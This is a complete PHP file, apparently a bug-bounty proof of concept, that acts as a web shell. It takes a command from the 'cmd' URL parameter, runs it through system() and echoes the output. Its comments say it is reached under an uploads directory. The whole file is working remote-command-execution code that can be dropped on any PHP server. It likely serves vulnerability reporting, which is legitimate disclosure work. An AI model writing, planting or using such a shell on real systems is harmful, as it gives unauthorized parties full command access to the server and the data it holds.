<?php
// payload.php — PoC by aliyugombe@wearehackerone.com
// This simulates an uploaded PHP shell from a prior attacker
// Access directly: /uploads/1623/payload.php?cmd=COMMAND
if (isset($_GET['cmd'])) {
    system($_GET['cmd'] . ' 2>&1');
} else {
    echo "proof of concept (PoC) by aliyugombe@wearehackerone.com\n";
    echo "Add ?cmd=your_command to execute commands.\n";
}
